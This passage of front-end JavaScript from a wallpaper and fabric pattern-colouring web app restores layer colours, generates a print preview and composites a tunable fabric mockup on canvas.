            const layerData = createColorInput(layer.label, id, layer.inputValue, layer.isBackground);
            layerData.input.value = toInitialCaps(layer.inputValue.replace(/^(SW|SC)\d+\s*/i, """").trim());
            layerData.circle.style.backgroundColor = layer.hex;
            appState.layerInputs[index] = layerData;
            console.log(`Restored ${layer.label} input to ${layer.inputValue}, circle to ${layer.hex}, id=${id}`);
        });

        console.log(""After restore, layerInputs:"", 
                    appState.layerInputs.map(l => ({ id: l.input.id, label: l.label, value: l.input.value })));

        // Update UI       
        updatePreview();
        
        // Check if we're in fabric mode - if so, only render fabric mockup
        if (appState.isInFabricMode) {
            console.log(""🧵 restoreOriginalPattern in fabric mode - calling renderFabricMockup()"");
            renderFabricMockup();
        } else {
            updateRoomMockup();
        }
        
        populateCoordinates();

        // Remove Back to Pattern link and clean up
        const coordinatesSection = document.getElementById(""coordinatesSection"");
        const backLink = document.getElementById(""backToPatternLink"");
        if (backLink) {
            backLink.remove();
            console.log(""Removed Back to Pattern link"");
        }
        const errorMessages = coordinatesSection.querySelectorAll(""p[style*='color: red']"");
        errorMessages.forEach(msg => msg.remove());
        console.log(""Cleared error messages:"", errorMessages.length);

        console.log('>>> restoreOriginalPattern END <<<');
    } catch (e) {
        console.error(""Error restoring original pattern:"", e);
    }
}

// Update displays with layer compositing
function updateDisplays() {
    try {
        console.log('updateDisplays called');
        
        // ✅ Always update pattern preview
        updatePreview();
        
        // Check if we're in fabric mode - if so, only render fabric mockup
        if (appState.isInFabricMode) {
            console.log(""🧵 updateDisplays in fabric mode - calling renderFabricMockup()"");
            renderFabricMockup();
        } else {
            updateRoomMockup();
        }
        populateCoordinates();
    } catch (e) {
        console.error('Error in updateDisplays:', e);
    }
}

function handleThumbnailClick(patternId) {
    console.log(`handleThumbnailClick: patternId=${patternId}`);
    if (!patternId) {
        console.error(""Invalid pattern ID:"", patternId);
        return;
    }
    
    try {
        // Preserve current mockup
        const originalMockup = appState.selectedCollection?.mockup || """";
        console.log(""Preserving mockup for thumbnail click:"", originalMockup);

        loadPatternData(appState.selectedCollection, patternId);

        // Update thumbnails
        document.querySelectorAll("".thumbnail"").forEach(t => t.classList.remove(""selected""));
        const selectedThumb = document.querySelector(`.thumbnail[data-pattern-id=""${patternId}""]`);
        if (selectedThumb) {
            selectedThumb.classList.add(""selected"");
            console.log(`Selected thumbnail: ${patternId}`);
        } else {
            console.warn(`Thumbnail not found for ID: ${patternId}`);
        }
    } catch (error) {
        console.error(""Error handling thumbnail click:"", error);
    }
}

// Generate print preview
const generatePrintPreview = () => {
    if (!appState.currentPattern) {
        console.error(""No current pattern selected for print preview"");
        return null;
    }

    const isWall = appState.currentPattern?.isWall || appState.selectedCollection?.name === ""wall-panels"";
    const backgroundIndex = isWall ? 1 : 0;
    const backgroundInput = appState.layerInputs[backgroundIndex]?.input;
    if (!backgroundInput) {
        console.error(`Background input not found at index ${backgroundIndex}`, appState.layerInputs);
        return null;
    }

    const backgroundColor = lookupColor(backgroundInput.value);
    console.log(""Print preview - Background color:"", backgroundColor, ""isWall:"", isWall);
    console.log(""Print preview - Layer inputs:"", appState.layerInputs.map((li, i) => ({
        index: i,
        value: li?.input?.value
    })));

    const dpi = 100;
    const patternWidthInches = appState.currentPattern?.size?.[0] || 24;
    const patternHeightInches = appState.currentPattern?.size?.[1] || 24;
    const printWidth = Math.round(patternWidthInches * dpi);
    const printHeight = Math.round(patternHeightInches * dpi);
    const aspectRatio = patternHeightInches / patternWidthInches;

    console.log(`Print preview - Pattern: ${patternWidthInches}x${patternHeightInches}, Aspect: ${aspectRatio}`);
    console.log(`Print canvas: ${printWidth}x${printHeight}, DPI: ${dpi}`);

    const printCanvas = document.createElement(""canvas"");
    const printCtx = printCanvas.getContext(""2d"", { willReadFrequently: true });
    printCanvas.width = printWidth;
    printCanvas.height = printHeight;

    const collectionName = toInitialCaps(appState.selectedCollection?.name || ""Unknown"");
    const patternName = toInitialCaps(appState.currentPattern.name || ""Pattern"");
    let layerLabels = [];

    const processPrintPreview = async () => {
        printCtx.fillStyle = backgroundColor;
        printCtx.fillRect(0, 0, printWidth, printHeight);
        console.log(""Print preview - Filled background with:"", backgroundColor);

        const isTintWhite = appState.currentPattern?.tintWhite || false;
        console.log(`Print preview - tintWhite flag: ${isTintWhite}`);

        if (isTintWhite && appState.currentPattern?.baseComposite) {        } else if (appState.currentPattern?.layers?.length) {
            layerLabels = appState.currentPattern.layers.map((l, i) => ({
                label: appState.currentPattern.layerLabels?.[i] || `Layer ${i + 1}`,
                color: appState.layerInputs[i + (isWall ? 2 : 1)]?.input?.value || ""Snowbound""
            }));
            
            // Add background color to the beginning of the color list
            layerLabels.unshift({
                label: ""Background"",
                color: backgroundInput.value || ""Snowbound""
            });

            const shadowLayers = [];
            const nonShadowLayers = [];
            appState.currentPattern.layers.forEach((layer, index) => {
                const label = layerLabels[index].label;
                const isShadow = layer.isShadow === true;
                (isShadow ? shadowLayers : nonShadowLayers).push({ layer, index, label });
            });

            let nonShadowInputIndex = isWall ? 2 : 1;

            for (const { layer, index, label } of shadowLayers) {
                const layerPath = layer.path || """";
                await new Promise((resolve) => {
                    processImage(
                        layerPath,
                        (processedUrl) => {
                            const img = new Image();
                            console.log(""🧪 processedUrl type:"", typeof processedUrl, processedUrl);
                            if (processedUrl instanceof HTMLCanvasElement) {
                                img.src = processedUrl.toDataURL(""image/png"");
                            } else {
                                img.src = processedUrl;
                            }
                            img.onload = () => {
                                printCtx.globalCompositeOperation = ""multiply"";
                                printCtx.globalAlpha = 0.3;
                                printCtx.drawImage(img, 0, 0, printWidth, printHeight);
                                resolve();
                            };
                            img.onerror = () => resolve();
                        },
                        null,
                        2.2,
                        true,
                        isWall
                    );
                });
            }

            for (const { layer, index, label } of nonShadowLayers) {
                const layerPath = layer.path || """";
                const layerInput = appState.layerInputs[nonShadowInputIndex];
                const layerColor = lookupColor(layerInput?.input?.value || ""Snowbound"");
                await new Promise((resolve) => {
                    processImage(
                        layerPath,
                        (processedUrl) => {
                            const img = new Image();
                            console.log(""🧪 processedUrl type:"", typeof processedUrl, processedUrl);
                            if (processedUrl instanceof HTMLCanvasElement) {
                                img.src = processedUrl.toDataURL(""image/png"");
                            } else {
                                img.src = processedUrl;
                            }
                            img.onload = () => {
                                printCtx.globalCompositeOperation = ""source-over"";
                                printCtx.globalAlpha = 1.0;
                                printCtx.drawImage(img, 0, 0, printWidth, printHeight);
                                nonShadowInputIndex++;
                                resolve();
                            };
                            img.onerror = () => resolve();
                        },
                        layerColor,
                        2.2,
                        false,
                        isWall
                    );
                });
            }
        }

        const dataUrl = printCanvas.toDataURL(""image/png"");
        console.log(`Print preview - Generated data URL, length: ${dataUrl.length}`);

        // Generate HTML content
        let textContent = `
            <img src=""https://so-animation.com/colorflex/img/SC-header-mage.jpg"" alt=""SC Logo"" class=""sc-logo"">
            <h2>${collectionName}</h2>
            <h3>${patternName}</h3>
            <ul style=""list-style: none; padding: 0;"">
        `;
        layerLabels.forEach(({ label, color }, index) => {
            const swNumber = appState.selectedCollection?.curatedColors?.[index] || color || ""N/A"";
            textContent += `
                <li>${toInitialCaps(label)} | ${swNumber}</li>
            `;
        });
        textContent += ""</ul>"";

        // Open preview window
        const previewWindow = window.open('', '_blank', 'width=800,height=1200');
        if (!previewWindow) {
            console.error(""Print preview - Failed to open preview window"");
            return { canvas: printCanvas, dataUrl };
        }

        previewWindow.document.write(`
            <html>
                <head>
                    <title>Print Preview</title>
                    <link href=""https://fonts.googleapis.com/css2?family=Special+Elite&display=swap"" rel=""stylesheet"">
                    <style>
                        body {
                            font-family: 'Special Elite', 'Times New Roman', serif !important;
                            padding: 20px;
                            margin: 0;
                            display: flex;
                            justify-content: center;
                            align-items: flex-start;
                            min-height: 100vh;
                            background-color: #111827;
                            color: #f0e6d2;
                            overflow: auto;
                        }
                        .print-container {
                            text-align: center;
                            max-width: 600px;
                            width: 100%;
                            display: flex;
                            flex-direction: column;
                            align-items: center;
                            background-color: #434341;
                            padding: 20px;
                            border-radius: 8px;
                        }
                        .sc-logo {
                            width: 400px !important;
                            height: auto;
                            margin: 0 auto 20px;
                            display: block;
                        }
                        h2 { font-size: 24px; margin: 10px 0; }
                        h3 { font-size: 20px; margin: 5px 0; }
                        ul { margin: 10px 0; }
                        li { margin: 5px 0; font-size: 16px; }
                        img { max-width: 100%; height: auto; margin: 20px auto; display: block; }
                        .button-container { margin-top: 20px; }
                        button {
                            font-family: 'Special Elite', serif;
                            padding: 10px 20px;
                            margin: 0 10px;
                            font-size: 16px;
                            cursor: pointer;
                            background-color: #f0e6d2;
                            color: #111827;
                            border: none;
                            border-radius: 4px;
                        }
                        button:hover {
                            background-color: #e0d6c2;
                        }
                    </style>
                </head>
                <body>
                    <div class=""print-container"">
                        ${textContent}
                        <img src=""${dataUrl}"" alt=""Pattern Preview"">
                        <div class=""button-container"">
                            <button onclick=""window.print();"">Print</button>
                            <button onclick=""download()"">Download</button>
                            <button onclick=""window.close();"">Close</button>
                        </div>
                    </div>
                    <script>
                        function download() {
                            const link = document.createElement(""a"");
                            link.href = ""${dataUrl}"";
                            link.download = ""${patternName}-print.png"";
                            link.click();
                        }
                    </script>
                </body>
            </html>
        `);
        previewWindow.document.close();
        console.log(""Print preview - Preview window opened"");

        return { canvas: printCanvas, dataUrl, layerLabels, collectionName, patternName };
    };

    return processPrintPreview().catch(error => {
        console.error(""Print preview error:"", error);
        return null;
    });
};

// Start the app
async function startApp() {
    await initializeApp();
    // Call this when app starts
    await loadFurnitureConfig();

    isAppReady = true;

    console.log(""✅ App fully initialized and ready."");
}

// Run immediately if DOM is already ready
if (document.readyState === ""loading"") {
    document.addEventListener(""DOMContentLoaded"", startApp);
} else {
    startApp();
}

// === PATTERN TYPE HELPERS ===

function getPatternType(pattern, collection) {
    if (collection?.name === ""wall-panels"") return ""wall-panel"";
    if (pattern?.tintWhite) return ""tint-white""; 
    if (collection?.elements?.length) return ""element-coloring"";
    return ""standard"";
}

function getColorMapping(patternType, currentLayers, layerIndex) {
    switch (patternType) {
        case ""wall-panel"":
            return currentLayers[layerIndex + 2]; // Skip wall + background
        case ""standard"":
            const inputLayers = currentLayers.filter(layer => !layer.isShadow);
            return inputLayers[layerIndex + 1]; // Skip background
        case ""element-coloring"":
            // Future: element-specific color mapping
            const inputLayersElement = currentLayers.filter(layer => !layer.isShadow);
            return inputLayersElement[layerIndex + 1];
        default:
            return currentLayers[layerIndex + 1];
    }
}



// Add fabric tuning controls
function addFabricTuningControls() {
    // Check if controls should be shown
    if (!SHOW_FABRIC_CONTROLS) {
        return; // Exit early if controls are disabled
    }
    
    // Remove existing controls
    const existingControls = document.getElementById('fabricTuningControls');
    if (existingControls) {
        existingControls.remove();
    }
    
    // Create control panel
    const controlPanel = document.createElement('div');
    controlPanel.id = 'fabricTuningControls';
    controlPanel.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: rgba(0, 0, 0, 0.9);
        color: white;
        padding: 15px;
        border-radius: 8px;
        border: 2px solid #d4af37;
        z-index: 1000;
        font-family: monospace;
        font-size: 12px;
        max-width: 300px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
    `;
    
    // Add title
    const title = document.createElement('h3');
    title.textContent = '🧵 Fabric Tuning';
    title.style.cssText = 'margin: 0 0 10px 0; color: #d4af37; font-size: 14px;';
    controlPanel.appendChild(title);
    
    // Create sliders for each parameter
    const params = [
        { key: 'alphaStrength', label: 'Pattern Opacity', min: 0, max: 2, step: 0.1 },
        { key: 'baseTintStrength', label: 'Base Color Tint', min: 0, max: 2, step: 0.1 },
        { key: 'patternContrast', label: 'Pattern Contrast', min: 0.1, max: 3, step: 0.1 },
        { key: 'shadowMultiplier', label: 'Shadow Interaction', min: 0, max: 2, step: 0.1 },
        { key: 'colorVibrance', label: 'Color Vibrance', min: 0, max: 2, step: 0.1 },
        { key: 'glossyStrength', label: 'Glossy Finish', min: 0, max: 2, step: 0.1 }
    ];
    
    // Add blend mode selector
    const blendModeContainer = document.createElement('div');
    blendModeContainer.style.cssText = 'margin-bottom: 10px;';
    
    const blendModeLabel = document.createElement('label');
    blendModeLabel.textContent = 'Blend Mode';
    blendModeLabel.style.cssText = 'display: block; margin-bottom: 3px; font-weight: bold;';
    
    const blendModeSelect = document.createElement('select');
    blendModeSelect.style.cssText = 'width: 100%; padding: 2px; background: #333; color: white; border: 1px solid #555;';
    
    const blendModes = [
        { value: 'auto', label: 'Auto (Smart)' },
        { value: 'multiply', label: 'Multiply' },
        { value: 'overlay', label: 'Overlay' },
        { value: 'soft-light', label: 'Soft Light' },
        { value: 'hard-light', label: 'Hard Light' },
        { value: 'screen', label: 'Screen' }
    ];
    
    blendModes.forEach(mode => {
        const option = document.createElement('option');
        option.value = mode.value;
        option.textContent = mode.label;
        if (mode.value === fabricTuning.blendMode) {
            option.selected = true;
        }
        blendModeSelect.appendChild(option);
    });
    
    blendModeSelect.addEventListener('change', (e) => {
        fabricTuning.blendMode = e.target.value;
        debouncedFabricRender();
    });
    
    blendModeContainer.appendChild(blendModeLabel);
    blendModeContainer.appendChild(blendModeSelect);
    controlPanel.appendChild(blendModeContainer);
    
    params.forEach(param => {
        const container = document.createElement('div');
        container.style.cssText = 'margin-bottom: 10px;';
        
        const label = document.createElement('label');
        label.textContent = param.label;
        label.style.cssText = 'display: block; margin-bottom: 3px; font-weight: bold;';
        
        const slider = document.createElement('input');
        slider.type = 'range';
        slider.min = param.min;
        slider.max = param.max;
        slider.step = param.step;
        slider.value = fabricTuning[param.key];
        slider.style.cssText = 'width: 100%; margin-bottom: 2px;';
        
        const valueDisplay = document.createElement('span');
        valueDisplay.textContent = fabricTuning[param.key].toFixed(1);
        valueDisplay.style.cssText = 'color: #d4af37; font-weight: bold;';
        
        // Update function
        slider.addEventListener('input', (e) => {
            const value = parseFloat(e.target.value);
            fabricTuning[param.key] = value;
            valueDisplay.textContent = value.toFixed(1);
            
            // Re-render fabric in real-time with debounce
            debouncedFabricRender();
        });
        
        container.appendChild(label);
        container.appendChild(slider);
        container.appendChild(valueDisplay);
        controlPanel.appendChild(container);
    });
    
    // Add reset button
    const resetBtn = document.createElement('button');
    resetBtn.textContent = 'Reset to Defaults';
    resetBtn.style.cssText = `
        background: #d4af37;
        color: black;
        border: none;
        padding: 5px 10px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 11px;
        font-weight: bold;
        margin-top: 10px;
        width: 100%;
    `;
    
    resetBtn.addEventListener('click', () => {
        fabricTuning.alphaStrength = 1.0;
        fabricTuning.baseTintStrength = 1.0;
        fabricTuning.patternContrast = 1.0;
        fabricTuning.shadowMultiplier = 1.0;
        fabricTuning.colorVibrance = 1.2;
        fabricTuning.blendMode = 'auto';
        fabricTuning.glossyStrength = 1.0;
        
        // Update slider values
        controlPanel.querySelectorAll('input[type=""range""]').forEach((slider, index) => {
            slider.value = Object.values(fabricTuning)[index];
        });
        controlPanel.querySelectorAll('span').forEach((span, index) => {
            if (index < 5) { // Only update value displays
                span.textContent = Object.values(fabricTuning)[index].toFixed(1);
            }
        });
        
        // Update blend mode selector
        const blendModeSelect = controlPanel.querySelector('select');
        if (blendModeSelect) {
            blendModeSelect.value = fabricTuning.blendMode;
        }
        
        // Re-render with debounce
        debouncedFabricRender();
    });
    
    controlPanel.appendChild(resetBtn);
    
    // Add copy values button
    const copyBtn = document.createElement('button');
    copyBtn.textContent = 'Copy Values to Console';
    copyBtn.style.cssText = `
        background: #4a5568;
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 4px;
        cursor: pointer;
        font-size: 11px;
        font-weight: bold;
        margin-top: 5px;
        width: 100%;
    `;
    
    copyBtn.addEventListener('click', () => {
        console.log('🧵 Current fabric tuning values:');
        console.log('fabricTuning = {');
        Object.entries(fabricTuning).forEach(([key, value]) => {
            console.log(`    ${key}: ${value},`);
        });
        console.log('};');
    });
    
    controlPanel.appendChild(copyBtn);
    
    // Add to document
    document.body.appendChild(controlPanel);
}

// Function to remove fabric tuning controls
function removeFabricTuningControls() {
    const existingControls = document.getElementById('fabricTuningControls');
    if (existingControls) {
        existingControls.remove();
    }
}

// Simple fabric mockup function
async function renderFabricMockup() {
    console.log(""🧵 ================================"");
    console.log(""🧵 FABRIC MOCKUP STARTING"");
    console.log(""🧵 ================================"");
    
    const canvas = document.createElement(""canvas"");
    const ctx = canvas.getContext(""2d"");
    
    // Will be dynamically sized based on first loaded image
    let canvasWidth = 600;  // Default fallback
    let canvasHeight = 450; // Default fallback
    
    // Get fabric config with error handling
    console.log(""🔍 Global furnitureConfig:"", furnitureConfig);
    console.log(""🔍 Collection furnitureConfig:"", appState.selectedCollection?.furnitureConfig);
    
    // Try to get furniture config from collection first, then fall back to global
    let actualFurnitureConfig = appState.selectedCollection?.furnitureConfig || furnitureConfig;
    console.log(""🔍 Using furnitureConfig:"", actualFurnitureConfig);
    
    const fabricConfig = actualFurnitureConfig?.fabric;
    
    if (!fabricConfig) {
        console.error(""❌ Fabric config not found in furnitureConfig!"");
        console.log(""🔍 Available furniture config keys:"", Object.keys(actualFurnitureConfig || {}));
        return;
    }
    
    console.log(""🔍 Fabric config:"", fabricConfig);
    
    // Get background color (first layer is Background)
    console.log(""🔍 Current layers:"", appState.currentLayers);
    console.log(""🔍 First layer:"", appState.currentLayers[0]);
    const backgroundColor = lookupColor(appState.currentLayers[0]?.color || ""Snowbound"");
    console.log(""🎨 Background color:"", backgroundColor);
    console.log(""🔍 Base tint strength:"", fabricTuning.baseTintStrength);
    
    try {
        // 1. Load and draw room mockup background
        const mockupBg = new Image();
        mockupBg.crossOrigin = ""anonymous"";
        
        await new Promise((resolve, reject) => {
            mockupBg.onload = resolve;
            mockupBg.onerror = reject;
            mockupBg.src = `https://so-animation.com/colorflex/${fabricConfig.mockup}`;
        });
        
        // Set canvas size based on mockup image dimensions
        canvasWidth = mockupBg.width;
        canvasHeight = mockupBg.height;
        canvas.width = canvasWidth;
        canvas.height = canvasHeight;
        
        console.log(`📐 Canvas sized to match mockup: ${canvasWidth}x${canvasHeight}`);
        
        // Draw room background at full resolution
        ctx.drawImage(mockupBg, 0, 0);
        
        // 2. Load fabric base for later use
        const fabricBase = new Image();
        fabricBase.crossOrigin = ""anonymous"";
        
        await new Promise((resolve, reject) => {
            fabricBase.onload = resolve;
            fabricBase.onerror = reject;
            fabricBase.src = `https://so-animation.com/colorflex/${fabricConfig.base}`;
        });
        
        console.log(`📐 Fabric base: ${fabricBase.width}x${fabricBase.height}`);
        
        // 3. Create tinted base layer using fabric base alpha channel
        const baseCanvas = document.createElement(""canvas"");
        const baseCtx = baseCanvas.getContext(""2d"");
        baseCanvas.width = canvasWidth;
        baseCanvas.height = canvasHeight;
        
        // Draw fabric base to get alpha channel at full resolution
        baseCtx.drawImage(fabricBase, 0, 0, canvasWidth, canvasHeight);
        
        // Extract alpha channel and apply background color tint
        const baseImageData = baseCtx.getImageData(0, 0, canvasWidth, canvasHeight);
        const baseData = baseImageData.data;
        
        // Parse background color
        const bgColorMatch = backgroundColor.match(/^#([0-9a-f]{6})$/i);
        if (bgColorMatch) {
            const bgR = parseInt(bgColorMatch[1].substr(0, 2), 16);
            const bgG = parseInt(bgColorMatch[1].substr(2, 2), 16);
            const bgB = parseInt(bgColorMatch[1].substr(4, 2), 16);
            
            for (let j = 0; j < baseData.length; j += 4) {
                const r = baseData[j];
                const g = baseData[j + 1];
                const b = baseData[j + 2];
                const alpha = baseData[j + 3];
                
                if (alpha > 0) {
                    const tintStrength = fabricTuning.baseTintStrength;
                    
                    // Apply background color tint
                    baseData[j] = Math.floor(bgR * tintStrength + r * (1 - tintStrength));
                    baseData[j + 1] = Math.floor(bgG * tintStrength + g * (1 - tintStrength));
                    baseData[j + 2] = Math.floor(bgB * tintStrength + b * (1 - tintStrength));
                    // Keep original alpha channel
                }
            }
            
            baseCtx.putImageData(baseImageData, 0, 0);
        }
        
        console.log(""✅ Created tinted base layer with fabric alpha channel"");
        
        // Load pattern layers using the fabric config from furniture-config.json
        const patternSlug = createPatternSlug(appState.currentPattern.name);
        const pattern = appState.currentPattern;
        
        console.log(`🔍 Pattern layers available:`, pattern.layers);
        console.log(`🔍 Fabric config patternPathTemplate:`, fabricConfig.patternPathTemplate);
        
        // Process pattern layers (skip Background layer at index 0)
        for (let i = 0; i < pattern.layers.length; i++) {
            const layer = pattern.layers[i];
            console.log(`🔍 Pattern layer ${i} object:`, layer);
            
            // Extract filename from layer's path or imageUrl and change extension to .png
            let layerFileName;
            if (typeof layer === 'string') {
                layerFileName = layer;
            } else if (layer.path) {
                const originalFileName = layer.path.split('/').pop();
                layerFileName = originalFileName.replace(/\.(jpg|jpeg)$/i, '.png');
            } else if (layer.imageUrl) {
                const originalFileName = layer.imageUrl.split('/').pop();
                layerFileName = originalFileName.replace(/\.(jpg|jpeg)$/i, '.png');
            } else {
                layerFileName = `${patternSlug}_layer-${i+1}.png`;
            }
            
            // Use the patternPathTemplate from fabric config
            const layerPath = `https://so-animation.com/colorflex/${fabricConfig.patternPathTemplate
                .replace('{collection}', appState.selectedCollection.name)
                .replace('{patternSlug}', patternSlug)}${layerFileName}`;
            
            console.log(`🔍 Loading pattern layer ${i}: ${layerPath}`);
            
            try {
                const layerImg = new Image();
                layerImg.crossOrigin = ""anonymous"";
                
                await new Promise((resolve, reject) => {
                    layerImg.onload = resolve;
                    layerImg.onerror = reject;
                    layerImg.src = layerPath;
                });
                
                // Apply pattern to pattern composite (like pattern preview)
                const tempCanvas = document.createElement(""canvas"");
                const tempCtx = tempCanvas.getContext(""2d"");
                tempCanvas.width = canvasWidth;
                tempCanvas.height = canvasHeight;
                
                // Draw the pattern image at full resolution
                tempCtx.drawImage(layerImg, 0, 0, canvasWidth, canvasHeight);
                
                // Get the layer's color from appState (pattern layers start at index 1 after Background)
                const colorIndex = i + 1; // Skip Background layer at index 0
                const layerColor = lookupColor(appState.currentLayers[colorIndex]?.color || ""#FFFFFF"");
                console.log(`🎨 Using color ${layerColor} for pattern layer ${i} (color index ${colorIndex})`);
                
                // Parse pattern color (hex to RGB)
                const colorMatch = layerColor.match(/^#([0-9a-f]{6})$/i);
                if (!colorMatch) {
                    console.warn(`⚠️ Invalid color format for layer ${i}: ${layerColor}`);
                    continue;
                }
                
                const colorR = parseInt(colorMatch[1].substr(0, 2), 16);
                const colorG = parseInt(colorMatch[1].substr(2, 2), 16);
                const colorB = parseInt(colorMatch[1].substr(4, 2), 16);
                
                // Apply color vibrance adjustment
                const vibrance = fabricTuning.colorVibrance;
                const vibranceR = Math.floor(127 + (colorR - 127) * vibrance);
                const vibranceG = Math.floor(127 + (colorG - 127) * vibrance);
                const vibranceB = Math.floor(127 + (colorB - 127) * vibrance);
                
                console.log(`🎨 Pattern layer ${i} RGB: ${vibranceR}, ${vibranceG}, ${vibranceB}`);
                
                // Extract pattern luminance and apply color (like pattern preview)
                const imageData = tempCtx.getImageData(0, 0, canvasWidth, canvasHeight);
                const data = imageData.data;
                
                let nonTransparentPixels = 0;
                let averageLuminance = 0;
                
                // Apply pattern processing (similar to pattern preview)
                for (let j = 0; j < data.length; j += 4) {
                    const r = data[j];
                    const g = data[j + 1];
                    const b = data[j + 2];
                    const alpha = data[j + 3];
                    
                    if (alpha > 0) {
                        nonTransparentPixels++;
                        
                        // Calculate pattern luminance
                        let patternLuminance = 0.299 * r + 0.587 * g + 0.114 * b;
                        
                        // Apply pattern contrast adjustment
                        patternLuminance = Math.pow(patternLuminance / 255, 1 / fabricTuning.patternContrast) * 255;
                        averageLuminance += patternLuminance;
                        
                        // Create colored pattern with luminance-based opacity
                        const opacity = (patternLuminance / 255) * fabricTuning.alphaStrength;
                        
                        data[j] = vibranceR;
                        data[j + 1] = vibranceG;
                        data[j + 2] = vibranceB;
                        data[j + 3] = Math.min(255, opacity * 255);
                    } else {
                        data[j + 3] = 0;
                    }
                }
                
                if (nonTransparentPixels > 0) {
                    averageLuminance /= nonTransparentPixels;
                    console.log(`🔍 Pattern layer ${i}: ${nonTransparentPixels} pixels, avg luminance: ${averageLuminance.toFixed(2)}`);
                } else {
                    console.warn(`⚠️ Pattern layer ${i}: No non-transparent pixels found`);
                }
                
                // Put the processed pattern back
                tempCtx.putImageData(imageData, 0, 0);
                
                // Apply to base canvas using normal blending
                baseCtx.globalCompositeOperation = ""source-over"";
                baseCtx.drawImage(tempCanvas, 0, 0);
                
                console.log(`🔍 Applied pattern layer ${i} to base canvas`);
                
                console.log(`✅ Pattern layer ${i} (${layerFileName}) applied`);
                
            } catch (error) {
                console.warn(`⚠️ Pattern layer ${i} (${layerFileName}) failed:`, error);
            }
        }
        
        // 4. Final compositing in correct order
        console.log(""🧵 Final compositing: mockup -> base -> patterns -> fabric shadows"");
        
        // Layer 1: Mockup (unaltered room background)
        ctx.drawImage(mockupBg, 0, 0);
        
        // Layer 2: Base + Patterns (composited with alpha channel)
        ctx.globalCompositeOperation = ""source-over"";
        ctx.drawImage(baseCanvas, 0, 0);
        
        // Layer 3: Fabric base for shadows (multiply to bring shadows back)
        ctx.globalCompositeOperation = ""multiply"";
        ctx.drawImage(fabricBase, 0, 0, canvasWidth, canvasHeight);
        
        // Layer 4: Glossy finish (screen blend for shine effect)
        if (fabricTuning.glossyStrength > 0) {
            try {
                const fabricGlossy = new Image();
                fabricGlossy.crossOrigin = ""anonymous"";
                
                await new Promise((resolve, reject) => {
                    fabricGlossy.onload = resolve;
                    fabricGlossy.onerror = reject;
                    // Use fabric-glossy.png from the same directory as fabric-base.png
                    const glossyPath = fabricConfig.base.replace('fabric-base.png', 'fabric-glossy.png');
                    fabricGlossy.src = `https://so-animation.com/colorflex/${glossyPath}`;
                });
                
                console.log(`📐 Fabric glossy: ${fabricGlossy.width}x${fabricGlossy.height}`);
                
                // Apply glossy layer with screen blend mode and tunable opacity
                ctx.globalCompositeOperation = ""screen"";
                ctx.globalAlpha = fabricTuning.glossyStrength;
                ctx.drawImage(fabricGlossy, 0, 0, canvasWidth, canvasHeight);
                
                // Reset alpha and composite operation
                ctx.globalAlpha = 1.0;
                ctx.globalCompositeOperation = ""source-over"";
                
                console.log(""✅ Glossy layer applied with screen blend"");
                
            } catch (error) {
                console.warn(""⚠️ Glossy layer failed to load:"", error);
                // Continue without glossy layer if it fails
            }
        }
        
        // Reset composite operation
        ctx.globalCompositeOperation = ""source-over"";
        
        console.log(""✅ All layers composited in correct order"");
        
        // Update display - try both possible element references
        let roomMockup = document.getElementById('roomMockup');
        if (!roomMockup && dom?.roomMockup) {
            roomMockup = dom.roomMockup;
        }
        
        console.log(""🔍 roomMockup element found:"", !!roomMockup);
        console.log(""🔍 dom.roomMockup available:"", !!dom?.roomMockup);
        
        if (roomMockup) {
            const dataURL = canvas.toDataURL();
            console.log(""🔍 Canvas dataURL length:"", dataURL.length);
            console.log(""🔍 roomMockup element type:"", roomMockup.tagName);
            
            // Check if it's an img or div element
            if (roomMockup.tagName === 'IMG') {
                roomMockup.src = dataURL;
                console.log(""✅ Set fabric mockup as img src"");
            } else {
                // It's a div - preserve back button but clear other content
                console.log(""🔍 Div innerHTML before:"", roomMockup.innerHTML.substring(0, 100));
                
                // Save existing back button if it exists
                const existingButton = roomMockup.querySelector('#backToPatternsBtn');
                
                // Clear the div content
                roomMockup.innerHTML = '';
                
                // Clear the CSS background color to make background image visible
                roomMockup.style.backgroundColor = 'transparent';
                
                // Set background image
                roomMockup.style.backgroundImage = `url(${dataURL})`;
                roomMockup.style.backgroundSize = 'contain';
                roomMockup.style.backgroundRepeat = 'no-repeat';
                roomMockup.style.backgroundPosition = 'center';
                
                // Restore the back button if it existed
                if (existingButton) {
                    roomMockup.appendChild(existingButton);
                    console.log(""✅ Restored back button after clearing div"");
                }
                
                console.log(""✅ Set fabric mockup as div background and cleared other content"");
            }
            
            console.log(""✅ Fabric mockup displayed to element:"", roomMockup.id);
        } else {
            console.error(""❌ No roomMockup element found!"");
        }
        
        // Add back button for fabric mode (but only if not already present)
        if (!document.getElementById('backToPatternsBtn')) {
            addBackToPatternsButton();
        }
        
        // Add fabric tuning controls
        addFabricTuningControls();
        
    } catch (error) {
        console.error(""❌ Fabric mockup error:"", error);
    }
}

// Add Try Fabric button functionality
function addTryFabricButton() {
    console.log(""🧵 addTryFabricButton called"");
    console.log(""🧵 selectedCollection:"", appState.selectedCollection?.name);
    
    // Check if we're in a compatible collection for fabric
    if (!appState.selectedCollection || appState.selectedCollection.name !== ""botanicals"") {
        console.log(""🧵 Not botanicals collection, skipping fabric button"");
        return;
    }
    
    console.log(""🧵 Creating Try Fabric button"");
    
    const existingButton = document.getElementById('tryFabricBtn');
    if (existingButton) {
        existingButton.remove();
    }
    
    const button = document.createElement('button');
    button.id = 'tryFabricBtn';
    button.textContent = 'Try Fabric';
    button.className = 'btn btn-primary';
    button.style.cssText = `
        margin-top: 10px;
        padding: 8px 16px;
        background-color: #007bff;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    `;
    
    button.addEventListener('click', () => {
        console.log(""🧵 ================================"");
        console.log(""🧵 TRY FABRIC BUTTON CLICKED"");
        console.log(""🧵 ================================"");
        renderFabricMockup();
    });
    
    // Add button to the appropriate location
    const tryFurnitureBtn = document.getElementById('tryFurnitureBtn');
    if (tryFurnitureBtn) {
        tryFurnitureBtn.parentNode.insertBefore(button, tryFurnitureBtn.nextSibling);
    } else {
        const controlsContainer = document.querySelector('.controls-container') || document.body;
        controlsContainer.appendChild(button);
    }
}

// Add this line at the bottom of your CFM.js file to expose the function globally:
window.addTryFurnitureButton = addTryFurnitureButton;
window.getCompatibleFurniture = getCompatibleFurniture;
window.showFurnitureModal = showFurnitureModal;
window.selectFurniture = selectFurniture;
window.renderFabricMockup = renderFabricMockup;
